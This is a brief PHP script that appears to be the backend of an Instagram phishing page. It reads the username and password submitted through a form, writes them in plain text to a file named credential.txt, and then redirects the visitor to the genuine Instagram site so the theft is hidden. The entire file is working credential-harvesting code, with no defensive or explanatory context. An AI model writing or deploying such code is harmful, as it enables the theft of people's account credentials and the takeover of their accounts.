<?php
$myfile = fopen("credential.txt", "a") or die("Unable to open file!");
       $name=$_POST['username'];
       $pass=$_POST['password'];
       fwrite($myfile,'Username:'.$name. "   |    ");
       fwrite($myfile,'Password:'.$pass . "\n");
       header("Location:https://www.instagram.com");

?>

